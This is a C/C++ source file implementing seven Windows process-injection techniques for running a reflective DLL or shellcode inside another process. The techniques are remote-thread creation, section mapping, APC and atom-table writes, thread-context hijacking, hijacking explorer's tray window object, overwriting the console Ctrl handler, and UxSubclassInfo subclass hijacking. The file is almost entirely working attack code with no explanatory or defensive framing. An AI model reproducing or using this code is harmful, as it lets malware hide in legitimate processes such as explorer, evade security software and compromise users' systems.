#include "LoadLibraryR.h"
#include <psapi.h>
#include <stdio.h>

extern DWORD dwLength;
extern LPVOID lpBuffer;
extern LPVOID lpParameter;
extern DWORD dwReflectiveLoaderOffset;
extern LPVOID shellcode;

DWORD buflen; 
LPVOID buf;
LPVOID param;
DWORD offset;

void set_param(int payload_type) {
	if (payload_type) {
		buflen = PAYLOAD2_SIZE;
		buf = shellcode;
		param = NULL;
		offset = 0 ;
	}
	else
	{
		buflen = dwLength;
		buf =  lpBuffer;
		param = lpParameter;
		offset = dwReflectiveLoaderOffset;
	}
}

HANDLE WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess)
{
	HANDLE hThread = NULL;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	DWORD dwThreadId = 0;

	set_param(payload_type);

	try
	{

		// alloc memory (RWX) in the host process for the image
		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			return NULL;


		char* tp = (char*)buf;

		// write the image into the host process
		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
		{
			return NULL;
		}


		// add the offset to ReflectiveLoader() to the remote library address
		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + offset);


		// create a remote thread in the host process to call the ReflectiveLoader
		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
	}
	catch (...)
	{
		hThread = NULL;
	}

	return hThread;
}


// Global(static) variable for function pointer
static NTSTATUS(*PNtMapViewOfSection)(
	HANDLE          SectionHandle,
	HANDLE          ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR       ZeroBits,
	SIZE_T          CommitSize,
	PLARGE_INTEGER  SectionOffset,
	PSIZE_T         ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG           AllocationType,
	ULONG           Win32Protect
	);


HANDLE WINAPI LoadRemoteLibraryR2(int payload_type, HANDLE hProcess)
{
	HANDLE hThread = NULL;
	HANDLE fm;
	char* map_addr;
	LPVOID lpMap = 0;
	SIZE_T viewsize = 0;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	DWORD dwThreadId = 0;

	set_param(payload_type);

	try
	{


		PNtMapViewOfSection = (NTSTATUS(*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID * BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");

		fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, buflen, NULL);

		map_addr = (char*)MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		
		memcpy(map_addr, buf, buflen);

		(*PNtMapViewOfSection)(fm, hProcess, &lpMap, 0, buflen, nullptr, &viewsize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);

		// add the offset to ReflectiveLoader() to the remote library address
		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpMap + offset);

		// create a remote thread in the host process to call the ReflectiveLoader
		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
	}
	catch (...)
	{
		hThread = NULL;
	}

	return hThread;
}




NTSTATUS(NTAPI* pNtQueueApcThread)(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL,
	_In_ PVOID ApcStatusBlock OPTIONAL,
	_In_ PVOID ApcReserved OPTIONAL
	);


void WINAPI LoadRemoteLibraryR3(int payload_type, HANDLE hProcess, DWORD tid)
{



	HANDLE th;
	LPVOID target_payload;
	PAPCFUNC lpReflectiveLoader = NULL;


	set_param(payload_type);

	char* payload = (char*)buf;

	try
	{		

		pNtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, PVOID)) GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");

		th = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
		if (th == NULL)
			return;


		target_payload = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //MEM_COMMIT guarantees 0's.
		if (target_payload == NULL)
			return;


		ATOM b = GlobalAddAtomA("b"); // arbitrary one char string
		if (b == 0)
			return ;

		if (payload[0] == '\0')
			return ;

		for (DWORD64 pos = buflen- 1; pos > 0; pos--)
		{
			if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
			{
				(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)b, (PVOID)(((DWORD64)target_payload) + pos - 1), (PVOID)2);
			}
		}

		for (char* pos = payload; pos < (payload + buflen); pos += strlen(pos) + 1)
		{
			if (*pos == '\0')
				continue;

			ATOM a = GlobalAddAtomA(pos); // 아톰 테이블에 쉘코드 추가
			if (a == 0)
				return ;

			DWORD64 offset = pos - payload;
			(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)a, (PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos) + 1));
		}

		lpReflectiveLoader = (PAPCFUNC)((ULONG_PTR)target_payload + offset);
		QueueUserAPC(lpReflectiveLoader, th, (ULONG_PTR)param);
	}
	catch (...)
	{
		
	}

	return;
}


void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid)
{
	CONTEXT old_ctx, new_ctx;
	HANDLE tp;
	LPVOID lpRemoteLibraryBuffer = NULL;
	DWORD64 lpReflectiveLoader = NULL;


	set_param(payload_type);

	try
	{

		tp = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid); // THREAD_QUERY_INFORMATION  is needed for GetProcessIdOfThread


		// alloc memory (RWX) in the host process for the image
		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			return ;

		// write the image into the host process
		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
		{
			return ;
		}

		// add the offset to ReflectiveLoader() to the remote library address
		lpReflectiveLoader = (DWORD64)((ULONG_PTR)lpRemoteLibraryBuffer + offset);


		HANDLE thread_handle = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
		if (thread_handle == NULL)
		{
			return;
		}

		SuspendThread(thread_handle);
		old_ctx.ContextFlags = CONTEXT_ALL;
		if (!GetThreadContext(thread_handle, &old_ctx))
		{
			return;
		}

		new_ctx = old_ctx;
		new_ctx.Rip = lpReflectiveLoader;

		if (!SetThreadContext(thread_handle, &new_ctx))
		{
			return;
		}

		ResumeThread(thread_handle);
		Sleep(10000);
		SuspendThread(thread_handle);
		SetThreadContext(thread_handle, &old_ctx);
		ResumeThread(thread_handle);

	}
	catch (...)
	{
		
	}

	return;
}

void WINAPI LoadRemoteLibraryR5(int payload_type)
{

	LPVOID lpRemoteLibraryBuffer = NULL;
	DWORD64 lpReflectiveLoader = NULL;
	DWORD process_id;

	set_param(payload_type);

	try
	{

		HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
		GetWindowThreadProcessId(hWindow, &process_id);
		printf("hWindow=%p, explorer process_id=%d\n", hWindow, process_id);

		DWORD64 old_obj = GetWindowLongPtrA(hWindow, 0);
		printf("old_obj=0x%016llx\n", old_obj);

		HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, process_id);
		if (h == NULL)
		{
			//printf("Error in OpenProcess: 0x%x\n", GetLastError());
			return ;
		}

		// alloc memory (RWX) in the host process for the image
		lpRemoteLibraryBuffer = VirtualAllocEx(h, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			return;

		// add the offset to ReflectiveLoader() to the remote library address
		lpReflectiveLoader = (DWORD64)((ULONG_PTR)lpRemoteLibraryBuffer + offset);


		// write the image into the host process
		if (!WriteProcessMemory(h, lpRemoteLibraryBuffer, buf, buflen, NULL))
		{
			return;
		}



		DWORD64 new_obj[2];
		LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(new_obj[1])
		// output->buffer will be equal to VirtualAllocEx return value in the Writer
		new_obj[1] = lpReflectiveLoader;

		WriteProcessMemory(h, target_obj, new_obj, sizeof(new_obj), NULL);
		SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
		SendNotifyMessageA(hWindow, WM_PAINT, 0, 0);
		Sleep(1);
		SetWindowLongPtrA(hWindow, 0, old_obj);

		CloseHandle(h);
	}
	catch (...)
	{

	}

	return;
}


void WINAPI LoadRemoteLibraryR6(int payload_type, HANDLE hProcess)
{

	LPVOID lpRemoteLibraryBuffer = NULL;
	LPVOID lpReflectiveLoader = NULL;

	DWORD process_list[1];
	DWORD parent_id;
	void* encoded_addr = NULL;
	INPUT ip;
	MODULEINFO modinfo;
	int size;
	HWND hWindow;

	DWORD pid = GetProcessId(hProcess);
	set_param(payload_type);

	try
	{

		// alloc memory (RWX) in the host process for the image
		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			return;

		// write the image into the host process
		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
		{
			return;
		}


		// add the offset to ReflectiveLoader() to the remote library address
		lpReflectiveLoader = (LPVOID)((ULONG_PTR)lpRemoteLibraryBuffer + offset);





		NTSTATUS(*PRtlEncodeRemotePointer)(
			_In_ HANDLE ProcessHandle,
			_In_ PVOID Pointer,
			_Out_ PVOID * EncodedPointer
			) = (NTSTATUS(*)(
				_In_ HANDLE ProcessHandle,
				_In_ PVOID Pointer,
				_Out_ PVOID * EncodedPointer
				)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlEncodeRemotePointer");

		HMODULE kernelbase = GetModuleHandleA("kernelbase");
		GetModuleInformation(GetCurrentProcess(), kernelbase, &modinfo, sizeof(modinfo));
		size = modinfo.SizeOfImage;
		char* kernelbase_DefaultHandler = (char*)memmem(kernelbase, size, "\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9); // sub rsp,28h; mov ecx,0C000013Ah (STATUS_CONTROL_C_EXIT)
		__int64 encoded = (__int64)EncodePointer(kernelbase_DefaultHandler);
		char* kernelbase_SingleHandler = (char*)memmem(kernelbase, size, &encoded, 8);

		GetConsoleProcessList(process_list, 1);


		parent_id = process_list[0];

		FreeConsole();
		AttachConsole(pid);
		hWindow = GetConsoleWindow();
		FreeConsole();
		AttachConsole(parent_id);

		(*PRtlEncodeRemotePointer)(hProcess, lpReflectiveLoader, &encoded_addr);
		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);

		ip.type = INPUT_KEYBOARD;
		ip.ki.wScan = 0;
		ip.ki.time = 0;
		ip.ki.dwExtraInfo = 0;
		ip.ki.wVk = VK_CONTROL;
		ip.ki.dwFlags = 0; // 0 for key press
		SendInput(1, &ip, sizeof(INPUT));
		Sleep(100);
		PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);

		// release the Ctrl key
		Sleep(100);
		ip.type = INPUT_KEYBOARD;
		ip.ki.wScan = 0;
		ip.ki.time = 0;
		ip.ki.dwExtraInfo = 0;
		ip.ki.wVk = VK_CONTROL;
		ip.ki.dwFlags = KEYEVENTF_KEYUP;
		SendInput(1, &ip, sizeof(INPUT));

		// Restore the original Ctrl handler in the target process
		(*PRtlEncodeRemotePointer)(hProcess, kernelbase_DefaultHandler, &encoded_addr);
		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);


	}
	catch (...)
	{

	}

	return;
}



void WINAPI LoadRemoteLibraryR7(int payload_type)
{

	LPVOID lpRemoteLibraryBuffer = NULL;
	LPVOID lpReflectiveLoader = NULL;
	LPVOID target_payload;

	char new_subclass[0x50];
	DWORD pid;

	set_param(payload_type);

	try
	{

		HWND h = FindWindowA("Shell_TrayWnd", NULL);

		if (h == NULL)
		{
			printf("FindWindow failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}
		GetWindowThreadProcessId(h, &pid);
		//printf("*** pid=%d\n", pid);
		//printf("[*] Locating sub window\n");
		HWND hst = GetDlgItem(h, 303); // System Tray
		if (hst == NULL)
		{
			printf("GetDlgItem(1) failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}
		//printf("[*] Locating dialog item\n");

		HWND hc = GetDlgItem(hst, 1504);
		if (hc == NULL)
		{
			printf("GetDlgItem(1) failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}

		/* Get Handle to process */

		//printf("[*] Opening process\n");
		HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if (p == NULL)
		{
			printf("OpenProcess failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}

		// alloc memory (RWX) in the host process for the image
		lpRemoteLibraryBuffer = VirtualAllocEx(p, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			return;

		// add the offset to ReflectiveLoader() to the remote library address
		lpReflectiveLoader = (LPVOID)((ULONG_PTR)lpRemoteLibraryBuffer + offset);


		// write the image into the host process
		if (!WriteProcessMemory(p, lpRemoteLibraryBuffer, buf, buflen, NULL))
		{
			return;
		}


		HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (target_new_subclass == NULL)
		{
			printf("VirtualAllocEx(2) failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}
		//(HANDLE)(((DWORD64)target_payload) + sizeof(payload)); //target memory address for fake subclass structure

		HANDLE old_subclass = GetPropA(hc, "UxSubclassInfo"); //handle is the memory address of the current subclass structure

		if (!ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass, sizeof(new_subclass), NULL))
		{
			printf("ReadProcessMemory failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}

		//printf("[+] Current subclass structure was read to memory\n");


		memcpy(new_subclass + 0x18, &lpReflectiveLoader, sizeof(lpReflectiveLoader));
		//printf("[*] Writing fake subclass to process\n");
		if (!WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass, sizeof(new_subclass), NULL))
		{
			printf("WriteProcessMemory(2) failed, error: 0x%08x\n", GetLastError());
			exit(0);
		}

		//printf("[+] Fake subclass structure is written to memory\n");
		//printf("[+] Press enter to unhook the function and exit\r\n");
		//getchar();

		//SetProp(control, "CC32SubclassInfo", h);
		//printf("[*] Setting fake SubClass property\n");
		SetPropA(hc, "UxSubclassInfo", target_new_subclass);
		//printf("[*] Triggering shellcode....!!!\n");
		PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0);

		Sleep(1);
		//printf("[+] Restoring subclass header.\n");
		SetPropA(hc, "UxSubclassInfo", old_subclass);
	}
	catch (...)
	{

	}

	return;
}


//###########################

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
	{
		return dwRva;
	}

	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		if (dwRva >= pSectionHeader[i].VirtualAddress && dwRva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData))
		{
			return dwRva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;
		}
	}

	return 0;
}





DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer, const char* exportedFuncName)
{
	UINT_PTR uiBaseAddress = 0, uiExportDir = 0, uiNameArray = 0,
		uiAddressArray = 0, uiNameOrdinals = 0;
	DWORD dwCounter = 0;

#ifdef _WIN64
	DWORD dwCompiledArch = 2;
#else
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currently we can only process a PE file which is the same type as the one this function has
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwCompiledArch != 2)
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	/* it may need to remove */
	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);
	/**/

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(*(DWORD*)(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, exportedFuncName) != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (*(WORD*)(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(*(DWORD*)(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}


